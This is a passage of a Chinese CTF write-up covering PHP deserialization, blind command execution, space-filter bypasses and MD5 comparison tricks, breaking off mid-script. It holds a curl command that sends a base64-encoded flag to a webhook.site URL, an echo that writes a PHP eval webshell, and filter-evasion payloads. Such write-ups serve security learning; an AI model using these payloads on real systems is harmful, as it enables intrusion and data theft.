class="hljs-comment">//如上将字符串转换为对象，且对象的值与类预定义的值无关，取决于被反序列化的字符串</span><br></code></pre></td></tr></table></figure><h5 id="反序列化漏洞的成因"><a href="#反序列化漏洞的成因" class="headerlink" title="反序列化漏洞的成因"></a><font style="color:rgb(79, 79, 79);">反序列化漏洞的成因</font></h5><p><font style="color:rgb(77, 77, 77);">反序列化过程中unserialize()函数的参数可以控制，传入特殊的序列化后的字符串可改变对象的属性值，并触发特定函数执行代码；</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//反序列化漏洞简单案例</span><br> <br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;haha&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">display</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-comment">//cmd=O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br><span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">display</span>();<br> <br><span class="hljs-meta">?&gt;</span><br> <br><span class="hljs-comment">//如上反序列化的内容是GET方法获得的，是可控的，传入上图注释中的cmd</span><br><span class="hljs-comment">//内容，可实现执行php代码：phpinfo();</span><br></code></pre></td></tr></table></figure><h4 id="常见的php反序列化ctf题目的做题步骤"><a href="#常见的php反序列化ctf题目的做题步骤" class="headerlink" title="常见的php反序列化ctf题目的做题步骤"></a>常见的php反序列化ctf题目的做题步骤</h4><p>1、复制源代码到本地</p><p>2、注释掉和属性无关的内容（只剩类名和属性）</p><p>3、根据题目需要给属性赋值（最关键的一步）</p><p>4、生成序列化数据，通常要urlencode</p><p>5、传递数据到服务器（攻击目标）</p><h2 id="一起吃豆豆"><a href="#一起吃豆豆" class="headerlink" title="一起吃豆豆"></a>一起吃豆豆</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731484862251-f2a41cc5-7b56-4c6d-8c03-2eac4637a572.png"></p><p>JS小游戏通关后会出现flag</p><p>由于F12键被禁用 于是鼠标右键检查进入开发者模式</p><p>在调试器处的index.js文件有游戏规则的相关js代码翻到最底部发现一段可疑密文 进行base64解码后发现flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731485141881-c48f6afa-f8a1-47df-a05c-f0369fff1f69.png"></p><h4 id><a href="#" class="headerlink" title></a></h4><h2 id="你听不到我的声音"><a href="#你听不到我的声音" class="headerlink" title="你听不到我的声音"></a>你听不到我的声音</h2><p>题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>以POST上传参数到shell可以进行任意命令执行 但是由于没有直接回显 , 我们需要用其他方式进行外带</p><p>1、重定向到文件</p><p>我们可以用流重定向符号来将输出内容重定向到文件中, 在通过浏览器进行下载</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=cat /flag&gt;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>上传后下载文件即可发现flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731592235566-325de4ff-55d3-44a1-9996-59a924955958.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731592190689-2b562867-dda8-42bf-beb3-74a10497fb67.png"></p><p>2、通过curl外带</p><p>我们可以通过 <a href="https://webhook.site/">https://webhook.site/</a> 来进行数据外带, 我们可以拿到这样一个链接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">https:<span class="hljs-comment">//webhook.site/aaa9bd52-0fe8-4c8e-b8d0-b13dd8fded07</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731592560803-ed1b4ab5-b61f-485f-aaa7-08b18abcb401.png"></p><p>此时这个路径下的所有请求都会被记录</p><p>于是我们可以通过shell指令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=curl https:<span class="hljs-comment">//webhook.site/aaa9bd52-0fe8-4c8e-b8d0-b13dd8fded07/`cat /flag | base64`</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731592964691-bddeb5d4-2c90-4605-86e6-a22f44fe28ca.png"></p><p>3、直接写马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;?php eval(\$_POST[0]);&quot;</span> &gt; a.php<br></code></pre></td></tr></table></figure><p>注意（$需要在前面加反斜杠进行转义）并且语句需要url编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-keyword">echo</span>%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">20</span><span class="hljs-keyword">eval</span>(%<span class="hljs-number">5</span>c%<span class="hljs-number">24</span>_POST%<span class="hljs-number">5</span>B0%<span class="hljs-number">5</span>D)%<span class="hljs-number">3</span>B%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">20</span>a.php<br></code></pre></td></tr></table></figure><p>在用中国蚁剑去连接得到flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731596746598-b8048b79-bab9-4f6c-90a4-c74919326c86.png"></p><p>得到flag</p><h4 id="关于linux常用命令——重定向"><a href="#关于linux常用命令——重定向" class="headerlink" title="关于linux常用命令——重定向"></a>关于linux常用命令——重定向</h4><p>参考文章<a href="https://blog.csdn.net/shanliangliuxing/article/details/8799153?ops_request_misc=&request_id=&biz_id=102&utm_term=%E9%87%8D%E5%AE%9A%E5%90%91%E5%88%B0%E6%96%87%E4%BB%B6&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-8799153.142%5Ev100%5Econtrol&spm=1018.2226.3001.4187">链接</a></p><p>重定向能够实现Linux命令的输入输出与文件之间重定向，以及实现将多个命令组合起来实现更加强大的命令。这部分涉及到的比较多的命令主要有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">cat：连接文件<br>sort：排序文本行<br>uniq：忽略或者报告重复行<br>wc：统计文件的行数、词数、字节数<br>grep：打印匹配制定模式的行<br>head：输出文件的头部<br>tail：输出文件的尾部<br>tee：从标准输入读，并往标准输出或者文件写<br></code></pre></td></tr></table></figure><h5 id="1、重定向符号"><a href="#1、重定向符号" class="headerlink" title="1、重定向符号"></a>1、重定向符号</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;               输出重定向到一个文件或设备 覆盖原来的文件<br>&gt;!              输出重定向到一个文件或设备 强制覆盖原来的文件<br>&gt;&gt;             输出重定向到一个文件或设备 追加原来的文件<br>&lt;               输入重定向到一个程序 <br></code></pre></td></tr></table></figure><h5 id="2、标准错误重定向符号"><a href="#2、标准错误重定向符号" class="headerlink" title="2、标准错误重定向符号"></a>2、标准错误重定向符号</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">2</span>&gt;             将一个标准错误输出重定向到一个文件或设备 覆盖原来的文件  b-shell<br><span class="hljs-number">2</span>&gt;&gt;           将一个标准错误输出重定向到一个文件或设备 追加到原来的文件<br><span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>         将一个标准错误输出重定向到标准输出 注释:<span class="hljs-number">1</span> 可能就是代表 标准输出<br>&gt;&amp;             将一个标准错误输出重定向到一个文件或设备 覆盖原来的文件  c-shell<br>|&amp;              将一个标准错误 管道 输送 到另一个命令作为输入<br></code></pre></td></tr></table></figure><h5 id="-1"><a href="#-1" class="headerlink" title></a></h5><p>  3、命令重导向示例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">在 bash 命令执行的过程中，主要有三种输出入的状况，分别是：<br><span class="hljs-number">1</span>. 标准输入；代码为 <span class="hljs-number">0</span> ；或称为 stdin ；使用的方式为 &lt;<br><span class="hljs-number">2</span>. 标准输出：代码为 <span class="hljs-number">1</span> ；或称为 stdout；使用的方式为 <span class="hljs-number">1</span>&gt;<br><span class="hljs-number">3</span>. 错误输出：代码为 <span class="hljs-number">2</span> ；或称为 stderr；使用的方式为 <span class="hljs-number">2</span>&gt;<br><br>test @test test]<span class="hljs-comment"># ls -al &gt; list.txt</span><br>将显示的结果输出到 <span class="hljs-keyword">list</span>.txt 文件中，若该文件以存在则予以取代！<br><br>[test @test test]<span class="hljs-comment"># ls -al &gt;&gt; list.txt</span><br>将显示的结果累加到 <span class="hljs-keyword">list</span>.txt 文件中，该文件为累加的，旧数据保留！<br><br>[test @test test]<span class="hljs-comment"># ls -al  1&gt; list.txt   2&gt; list.err</span><br>将显示的数据，正确的输出到 <span class="hljs-keyword">list</span>.txt 错误的数据输出到 <span class="hljs-keyword">list</span>.err<br><br>[test @test test]<span class="hljs-comment"># ls -al 1&gt; list.txt 2&gt; &amp;1</span><br>将显示的数据，不论正确或错误均输出到 <span class="hljs-keyword">list</span>.txt 当中！<br>错误与正确文件输出到同一个文件中，则必须以上面的方法来写！不能写成其它格式！<br><br>test @test test]<span class="hljs-comment"># ls -al 1&gt; list.txt 2&gt; /dev/null</span><br>将显示的数据，正确的输出到 <span class="hljs-keyword">list</span>.txt 错误的数据则予以丢弃！<br>/dev/<span class="hljs-literal">null</span> ，可以说成是黑洞装置。为空，即不保存。<br><br></code></pre></td></tr></table></figure><h5 id="4、为何要使用命令输出重导向"><a href="#4、为何要使用命令输出重导向" class="headerlink" title="4、为何要使用命令输出重导向"></a>4、为何要使用命令输出重导向</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">当屏幕输出的信息很重要，而且我们需要将他存下来的时候；<br>背景执行中的程序，不希望他干扰屏幕正常的输出结果时；<br>一些系统的例行命令（例如写在 /etc/crontab 中的文件）的执行结果，希望他可以存下来时；<br>一些执行命令，我们已经知道他可能的错误讯息，所以想以『 <span class="hljs-number">2</span>&gt; /dev/<span class="hljs-literal">null</span> 』将他丢掉时；<br>错误讯息与正确讯息需要分别输出时。<br></code></pre></td></tr></table></figure><h4 id="关于curl外带原理"><a href="#关于curl外带原理" class="headerlink" title="关于curl外带原理"></a>关于curl外带原理</h4><p>参考文章<a href="https://blog.csdn.net/qq_46918279/article/details/121061134?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522D504C9D0-BC4E-4E9F-A061-C95391708225%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=D504C9D0-BC4E-4E9F-A061-C95391708225&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-121061134-null-null.142%5Ev100%5Econtrol&utm_term=curl%E5%A4%96%E5%B8%A6&spm=1018.2226.3001.4187">链接</a></p><h5 id="curl简介"><a href="#curl简介" class="headerlink" title="curl简介"></a>curl简介</h5><p>curl是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具。</p><p>cURL支持的通信协议有FTP、FTPS、HTTP、HTTPS等等。</p><h5 id="curl使用条件"><a href="#curl使用条件" class="headerlink" title="curl使用条件"></a>curl使用条件</h5><p>无论是在渗透测试还是ctf比赛中我们都可能会遇到目标应用把用户的输入当做系统命令或者系统命令的一部分去执行的情况。</p><p>在实际渗透中，还有很多不会直接回显的情况，这种时候我们就需要利用各种带外通信技巧</p><p>如题目中就是配合网站<a href="https://webhook.site/%E8%BF%9B%E8%A1%8Ccurl%E5%A4%96%E5%B8%A6%E5%BE%97%E5%88%B0flag">https://webhook.site/进行curl外带得到flag</a></p><h5 id="curl使用方法"><a href="#curl使用方法" class="headerlink" title="curl使用方法"></a>curl使用方法</h5><p>语法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">curl [option] [url]<br></code></pre></td></tr></table></figure><p> 使用命令：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">curl http:<span class="hljs-comment">//curl.haxx.se</span><br></code></pre></td></tr></table></figure><p> 这是最简单的使用方法。用这个命令获得了<a href="http://curl.haxx.se指向的页面,同样,如果这里的url指向的是一个文件或者一幅图都可以直接下载到本地/">http://curl.haxx.se指向的页面，同样，如果这里的URL指向的是一个文件或者一幅图都可以直接下载到本地</a>  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">curl -X POST -F xx=@flag.php  http:<span class="hljs-comment">//aaa</span><br></code></pre></td></tr></table></figure><p>这条命令被目标网站执行，那么意思就是：从目标网站以POST方式向<a href="http://aaa/">http://aaa</a>上传一个文件，名字叫xx 文件内容是flag.php（要使用curl上传文件时，只需在文件位置之前添加@。该文件可以支持任意类型的文件）</p><h2 id="RCEisamazingwithspace"><a href="#RCEisamazingwithspace" class="headerlink" title="RCEisamazingwithspace"></a>RCEisamazingwithspace</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731649542204-939a62d5-e2c8-4207-8874-5a6f2c2eaa25.png"></p><p>php代码审计发现任意命令执行并且存在正则匹配过滤空格</p><p>所以我们只需将任意命令中的空格替代就可获得flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731649870902-1c5713a4-79c5-48a7-871b-7f84a6d64ccc.png"></p><h4 id="常用的代替空格的符号"><a href="#常用的代替空格的符号" class="headerlink" title="常用的代替空格的符号"></a>常用的代替空格的符号</h4><p>参考文章<a href="https://blog.csdn.net/2301_76690905/article/details/134759718?ops_request_misc=&request_id=&biz_id=102&utm_term=%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E5%B8%B8%E7%94%A8%E4%BB%A3%E6%9B%BF%E7%A9%BA%E6%A0%BC%E7%9A%84%E7%AC%A6%E5%8F%B7&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-134759718.142%5Ev100%5Epc_search_result_base7&spm=1018.2226.3001.4187">链接</a></p><h5 id="1、大括号-："><a href="#1、大括号-：" class="headerlink" title="1、大括号{}："></a><font style="color:rgb(77, 77, 77);">1、大括号{}：</font></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;cat,flag.php&#125;<br></code></pre></td></tr></table></figure><h5 id="2、-IFS代替空格"><a href="#2、-IFS代替空格" class="headerlink" title="2、$IFS代替空格"></a>2、$IFS代替空格</h5><p><font style="color:rgb(77, 77, 77);">$IFS$9，${IFS}，$IFS这三个都行</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符 (internal field separator)。<br>?cmd=ls<span class="hljs-variable">$IFS</span>-I<br>单纯<span class="hljs-variable">$IFS2</span>,IFS2被bash解释器当做变量名，输不出来结果，加一个&#123;&#125;就固定了变量名<br>?cmd=ls$&#123;IFS&#125;-l<br>$IFS$<span class="hljs-number">9</span>后面加个$与&#123;&#125;类似，起截断作用，$<span class="hljs-number">9</span>是当前系统shell进程第九个参数持有者始终为空字符串。<br>?cmd=ls$&#123;IFS&#125;$<span class="hljs-number">9</span>-l<br></code></pre></td></tr></table></figure><h5 id="3、重定向字符"><a href="#3、重定向字符" class="headerlink" title="3、重定向字符&lt;，&lt;&gt;"></a><font style="color:rgb(77, 77, 77);">3、重定向字符&lt;，&lt;&gt;</font></h5><h5 id="4、-09绕过（相当于Tab键）"><a href="#4、-09绕过（相当于Tab键）" class="headerlink" title="4、%09绕过（相当于Tab键）"></a><font style="color:rgb(77, 77, 77);">4、%09绕过（相当于Tab键）</font></h5><h2 id="听说你很懂MD5？"><a href="#听说你很懂MD5？" class="headerlink" title="听说你很懂MD5？"></a><font style="background-color:#FFFFFF;">听</font><font style="color:#000000;background-color:#FFFFFF;">说你很懂MD5？</font></h2><p>题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// 所以你说你懂 MD5 了?</span><br><br><span class="hljs-variable">$apple</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;banana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$apple</span> !== <span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$banana</span>))) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;加强难度就不会了?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 什么? 你绕过去了?</span><br><span class="hljs-comment">// 加大剂量!</span><br><span class="hljs-comment">// 我要让他成为 string</span><br><span class="hljs-variable">$apple</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;appple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bananana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span> !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) == <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;难吗?不难!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 你还是绕过去了?</span><br><span class="hljs-comment">// 哦哦哦, 我少了一个等于号</span><br><span class="hljs-variable">$apple</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;apppple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;banananana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span> !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$banana</span>))) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 你以为这就结束了</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>)) . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br>&#125;<br><br><span class="hljs-comment">// 你想看到 random 的值吗?</span><br><span class="hljs-comment">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span><br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;random&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>] ?? <span class="hljs-string">&#x27;user&#x27;</span>;<br><br><span class="hljs-comment">// check if name ends with &#x27;admin&#x27;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, -<span class="hljs-number">5</span>) !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;不是管理员也来凑热闹?&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$md5</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span> . <span class="hljs-variable">$name</span>) !== <span class="hljs-variable">$md5</span>) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;伪造? NO NO NO!&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 认输了, 看样子你真的很懂 MD5</span><br><span class="hljs-comment">// 那 flag 就给你吧</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;看样子你真的很懂 MD5&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>第一个地方用的强比较, 我们可以利用数组绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">banana[]=<span class="hljs-number">2</span>&amp;apple[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>第二个地方强转成了 string, 此时数组会变成<font style="color:#601BDE;">Array</font>无法绕过</p><p>但是由于后面是弱相等 让 <font style="color:#601BDE;">0e</font>开头的字符串使 php 误认为是科学计数法, 从而转换为 0</p><p>我们只需要寻找md5加密后是0e开头的即可</p><p>以下md5后开头为0e的字符串：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">QNKCDZO<br><span class="hljs-number">240610708</span><br>s878926199a<br>s155964671a<br>s214587387a<br><span class="hljs-number">0e215962017</span><br></code></pre></td></tr></table></figure><p>所以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">banana[]=<span class="hljs-number">2</span>&amp;apple[]=<span class="hljs-number">1</span>&amp;bananana=QNKCDZO&amp;appple=s155964671a<br></code></pre></td></tr></table></figure><p>第三个地方第二个地方用了强比较, 此时我们需要找到真实的 MD5 值一致的内容</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731554469093-4f44afdb-7d23-46a2-b9f5-525f2a5b0ba2.png"></p><p>由于两个不同字符串可以拥有相同的md5值</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731561974417-a7d7c1a3-b211-4a30-a8a9-54c9691ce118.png"></p><p>第四个地方用到了哈希长度拓展攻击</p><p>这里用到python的脚本工具</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span 